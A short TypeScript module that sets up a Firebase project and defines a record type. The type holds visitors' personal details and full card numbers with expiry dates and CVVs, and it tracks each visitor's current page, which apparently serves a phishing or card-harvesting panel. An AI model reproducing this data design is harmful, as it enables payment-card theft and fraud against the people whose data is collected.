import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyCxfQn65itRa9CsfW76WyeVCLQZWXM05ko",
  authDomain: "zxzx-30823.firebaseapp.com",
  projectId: "zxzx-30823",
  storageBucket: "zxzx-30823.firebasestorage.app",
  messagingSenderId: "330613674822",
  appId: "1:330613674822:web:34af538269d069741acb47",
  measurementId: "G-V1K9MCG17E"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
